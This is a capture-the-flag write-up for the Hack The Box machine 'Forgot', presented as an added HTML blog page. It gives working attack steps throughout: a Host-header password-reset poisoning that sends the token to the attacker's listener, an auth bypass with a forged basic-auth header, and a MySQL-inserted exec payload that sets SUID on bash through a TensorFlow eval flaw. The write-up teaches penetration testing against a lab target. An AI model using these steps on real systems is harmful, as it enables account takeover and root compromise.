@@ -1,0 +1,294 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8083932952140695"
+     crossorigin="anonymous"></script>
+    <title>HTB - Forgot [Medium] // meowmeowattack</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.105.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="meowmeowattack" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://meowmeowattack.github.io/css/main.min.fe9a01128f24537e52223a846795c30968baf4cbb17d0f03a14ea859993459ca.css" />
+
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-SLVHGT13XR"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-SLVHGT13XR', { 'anonymize_ip': false });
+}
+</script>
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB - Forgot [Medium]"/>
+<meta name="twitter:description" content="TCP Scan &gt; TARGET=10.129.71.155 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 63 Werkzeug/2.1.2 Python/3.8.10 |_http-server-header: Werkzeug/2.1.2 Python/3.8.10 | fingerprint-strings: | FourOhFourRequest: | HTTP/1."/>
+
+    <meta property="og:title" content="HTB - Forgot [Medium]" />
+<meta property="og:description" content="TCP Scan &gt; TARGET=10.129.71.155 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 63 Werkzeug/2.1.2 Python/3.8.10 |_http-server-header: Werkzeug/2.1.2 Python/3.8.10 | fingerprint-strings: | FourOhFourRequest: | HTTP/1." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://meowmeowattack.github.io/htb/forgot/" /><meta property="article:section" content="htb" />
+<meta property="article:published_time" content="2022-11-14T13:53:21+13:00" />
+<meta property="article:modified_time" content="2022-11-14T13:53:21+13:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://meowmeowattack.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="meowmeowattack" /></a>
+      <span class="app-header-title">meowmeowattack</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">/meow</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/htb/">/htb</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/notes/">/notes</a>
+      </nav>
+      <p>the meow of pentest</p>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">HTB - Forgot [Medium]</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Nov 14, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          5 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="tcp-scan">TCP Scan</h1>
+<pre tabindex="0"><code>&gt; TARGET=10.129.71.155 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap
+
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    syn-ack ttl 63 Werkzeug/2.1.2 Python/3.8.10
+|_http-server-header: Werkzeug/2.1.2 Python/3.8.10
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 NOT FOUND
+|     Server: Werkzeug/2.1.2 Python/3.8.10
+|     Date: Sun, 13 Nov 2022 20:04:35 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 207
+|     X-Varnish: 32775
+|     Age: 0
+|     Via: 1.1 varnish (Varnish/6.2)
+|     Connection: close
+|     &lt;!doctype html&gt;
+|     &lt;html lang=en&gt;
+|     &lt;title&gt;404 Not Found&lt;/title&gt;
+|     &lt;h1&gt;Not Found&lt;/h1&gt;
+|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
+|   GetRequest: 
+|     HTTP/1.1 302 FOUND
+|     Server: Werkzeug/2.1.2 Python/3.8.10
+|     Date: Sun, 13 Nov 2022 20:04:26 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 219
+|     Location: http://127.0.0.1
+|     X-Varnish: 32770
+|     Age: 0
+|     Via: 1.1 varnish (Varnish/6.2)
+|     Connection: close
+|     &lt;!doctype html&gt;
+|     &lt;html lang=en&gt;
+|     &lt;title&gt;Redirecting...&lt;/title&gt;
+|     &lt;h1&gt;Redirecting...&lt;/h1&gt;
+|     &lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=&#34;http://127.0.0.1&#34;&gt;http://127.0.0.1&lt;/a&gt;. If not, click the link.
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Server: Werkzeug/2.1.2 Python/3.8.10
+|     Date: Sun, 13 Nov 2022 20:04:27 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Allow: HEAD, OPTIONS, GET
+|     Content-Length: 0
+|     X-Varnish: 3
+|     Age: 0
+|     Via: 1.1 varnish (Varnish/6.2)
+|     Accept-Ranges: bytes
+|     Connection: close
+|   RTSPRequest, SIPOptions: 
+|_    HTTP/1.1 400 Bad Request
+| http-methods: 
+|_  Supported Methods: GET HEAD OPTIONS
+|_http-title: Login
+</code></pre><h1 id="web-enum">Web Enum</h1>
+<pre tabindex="0"><code>&gt; dirsearch -u http://10.129.71.155/
+
+15:19:10] 200 -    5KB - /forgot
+[15:19:14] 401 -   19B  - /home
+[15:19:26] 401 -   19B  - /login
+[15:19:50] 200 -    5KB - /reset
+</code></pre><ul>
+<li>Inspecting the code at http://10.129.71.155, found a comment that reveals a username. We can attempt to reset the password of this account</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">&lt;!--</span> <span style="color:#a6e22e">Q1</span> <span style="color:#a6e22e">release</span> <span style="color:#a6e22e">fix</span> <span style="color:#a6e22e">by</span> <span style="color:#a6e22e">robert</span><span style="color:#f92672">-</span><span style="color:#a6e22e">dev</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10045</span> <span style="color:#f92672">--&gt;</span>
+</span></span></code></pre></div><h1 id="account-takeover">Account takeover</h1>
+<ul>
+<li>Trying the account at <code>http://10.129.71.155/forgot</code> will show the following message, ensuring it&rsquo;s a valid account</li>
+</ul>
+<pre tabindex="0"><code>Password reset link has been sent to user inbox. Please use the link to reset your password
+</code></pre><ul>
+<li>Intercept the requests with burp and examine the password reset request</li>
+</ul>
+<pre tabindex="0"><code># Change the host header of the reset req to kali box
+GET /forgot?username=robert-dev-10045 HTTP/1.1
+Host: &lt;kali-ip&gt;
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://10.129.71.155/forgot
+Cookie: &lt;cookies&gt;
+
+
+# setup a listener to capture the reset response
+INFO:root:Starting httpd...
+
+INFO:root:GET request,
+Path: /reset?token=&lt;reset-token&gt;
+Headers:
+Host: &lt;kali-ip&gt;
+User-Agent: python-requests/2.22.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+10.129.71.155 - - [13/Nov/2022 17:27:09] &#34;GET /reset?token=&lt;reset-token&gt; HTTP/1.1&#34; 200 -
+</code></pre><ul>
+<li>Now, we captured the reset token, we can now use this token to reset the password of the account <code>robert-dev-10045</code>. NOTE: the token may contain some character that will be interpreted by the browser, therefore, it&rsquo;s important to url encode the token before sending. Also, some tokens work, some don&rsquo;t; be patient.</li>
+</ul>
+<pre tabindex="0"><code>POST /reset?token=&lt;url-encoded-token&gt; HTTP/1.1
+Host: 10.129.71.155
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 13
+Origin: http://10.129.71.155
+Connection: close
+Referer: http://10.129.71.155/reset?token=&lt;url-encoded-token&gt;
+Cookie: &lt;cookies&gt;
+
+password=test
+</code></pre><ul>
+<li>The changed password expires very quickly, so you may need to repeat this multiple times.</li>
+<li>After resetting the password, we can now login as <code>robert-dev-10045</code></li>
+</ul>
+<h1 id="foothold">Foothold</h1>
+<ul>
+<li>Examine the source at <code>http://10.129.71.155/escalate</code> found the following paths, which reveals a path to <code>/admin_tickets</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/home&#34;</span>&gt;home&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/tickets&#34;</span>&gt;tickets&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/escalate&#34;</span>&gt;escalate&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/admin_tickets&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;disabled&#34;</span>&gt;tickets(escalated)&lt;/<span style="color:#f92672">a</span>&gt;     
+</span></span></code></pre></div><ul>
+<li>Examine the request&rsquo;s <code>Authorization</code> header shows that it uses basic auth. Decode the base64 content shows that it&rsquo;s using our changed credential: <code>robert-dev-10045:test</code>.</li>
+<li>Change this to <code>admin:test</code> (i.e <code>YWRtaW46dGVzdA==</code>) and re-encode with base64 and send a request to <code>/admin_tickets</code> returns the content of an admin support ticket which contains the password of a user <code>diego</code></li>
+</ul>
+<pre tabindex="0"><code># request
+GET /admin_tickets HTTP/1.1
+Host: 10.129.71.155
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Authorization: Basic YWRtaW46dGVzdA==
+Connection: close
+Cookie: &lt;cookies&gt;
+Upgrade-Insecure-Requests: 1
+
+# response
+&lt;tr&gt;
+    &lt;td&gt;SSH Credentials are not working for Jenkins Slave machine&lt;/td&gt;
+    &lt;td&gt;Diego (Devops Lead)&lt;/td&gt;
+    &lt;td&gt;http://forgot.htb/tickets/102&lt;/td&gt;
+    &lt;td&gt;I&amp;#39;ve tried with diego:d**********q. The automation tasks has been blocked due to this issue. Please resolve this at the earliest&lt;/td&gt;
+&lt;/tr&gt;
+</code></pre><ul>
+<li>Login as <code>diego</code> via ssh to get the user flag</li>
+</ul>
+<h1 id="pe">PE</h1>
+<ul>
+<li>From <code>bot.py</code>, we can loot the admin pass and db pass</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>conn <span style="color:#f92672">=</span> mysql<span style="color:#f92672">.</span>connector<span style="color:#f92672">.</span>connect(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;localhost&#34;</span>,database<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;app&#34;</span>,user<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;diego&#34;</span>,password<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;d**********q&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>requests<span style="color:#f92672">.</span>get(i[<span style="color:#ae81ff">2</span>],headers<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;Authorization&#39;</span>:<span style="color:#e6db74">&#39;Basic YWRtaW46ZEN2Ymd********zNjgzNTJjQCE=&#39;</span>})
+</span></span></code></pre></div><ul>
+<li>Check sudo privileges</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>diego@forgot:~$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> diego on forgot:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User diego may run the following commands on forgot:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> NOPASSWD: /opt/security/ml_security.py
+</span></span></code></pre></div><ul>
+<li>Browsing the code <code>ml_security.py</code> found the use of tensorflow <code>preprocess_input_exprs_arg_string</code>. This is vulnerable for tensorflow &lt; 2.6.4: <a href="https://github.com/advisories/GHSA-75c9-jrh4-79mc">https://github.com/advisories/GHSA-75c9-jrh4-79mc</a></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>preprocess_input_exprs_arg_string(data[i],safe<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)  <span style="color:#75715e"># ln: 141</span>
+</span></span></code></pre></div><ul>
+<li>Essentially, <code>safe=False</code> forces the function to execute an <code>eval</code> statement which we can use to achieve code execution.</li>
+<li>The code reads from the <code>escalate</code> table and examines the <code>reason</code> field for malicious patterns (seemingly xss related)</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>cursor<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#39;select reason from escalate&#39;</span>)
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> [i[<span style="color:#ae81ff">0</span>] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> cursor<span style="color:#f92672">.</span>fetchall()]
+</span></span><span style="display:flex;"><span>data<span style="color:#f92672">=</span>[]
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> r:
+</span></span><span style="display:flex;"><span>        data<span style="color:#f92672">.</span>append(i)
+</span></span><span style="display:flex;"><span>Xnew <span style="color:#f92672">=</span> getVec(data)
+</span></span></code></pre></div><ul>
+<li>If the number of malicious pattern detected passes a threshold, it will execute the vulnerable function</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>score <span style="color:#f92672">=</span> ((<span style="color:#ae81ff">.175</span><span style="color:#f92672">*</span>ynew1[i])<span style="color:#f92672">+</span>(<span style="color:#ae81ff">.15</span><span style="color:#f92672">*</span>ynew2[i])<span style="color:#f92672">+</span>(<span style="color:#ae81ff">.05</span><span style="color:#f92672">*</span>ynew3[i])<span style="color:#f92672">+</span>(<span style="color:#ae81ff">.075</span><span style="color:#f92672">*</span>ynew4[i])<span style="color:#f92672">+</span>(<span style="color:#ae81ff">.25</span><span style="color:#f92672">*</span>ynew5[i])<span style="color:#f92672">+</span>(<span style="color:#ae81ff">.3</span><span style="color:#f92672">*</span>ynew6[i]))
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> score <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">.5</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        preprocess_input_exprs_arg_string(data[i],safe<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span></code></pre></div><ul>
+<li>So, we can overwrite the db with malicious contents in the <code>reason</code> field and run the script to execute our payload.</li>
+<li>With the db credential in bot.py, we can login to the database. To exploit, 2 steps are involved:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># step 1: login to mysql db and insert a malicious row</span>
+</span></span><span style="display:flex;"><span>diego@forgot:~$ mysql -D app -udiego -p
+</span></span><span style="display:flex;"><span>mysql&gt; insert into escalate values <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;1&#34;</span>,<span style="color:#e6db74">&#34;1&#34;</span>,<span style="color:#e6db74">&#34;1&#34;</span>,<span style="color:#e6db74">&#39;test=exec(&#34;&#34;&#34;\nimport os\nos.system(&#34;chmod +s /usr/bin/bash&#34;)&#34;&#34;&#34;)&#39;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># step 2: run script with sudo</span>
+</span></span><span style="display:flex;"><span>diego@forgot:~$ sudo /opt/security/ml_security.py
+</span></span><span style="display:flex;"><span>diego@forgot:~$ /usr/bin/bash -p
+</span></span><span style="display:flex;"><span>bash-5.0# cat /root/root.txt
+</span></span></code></pre></div>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
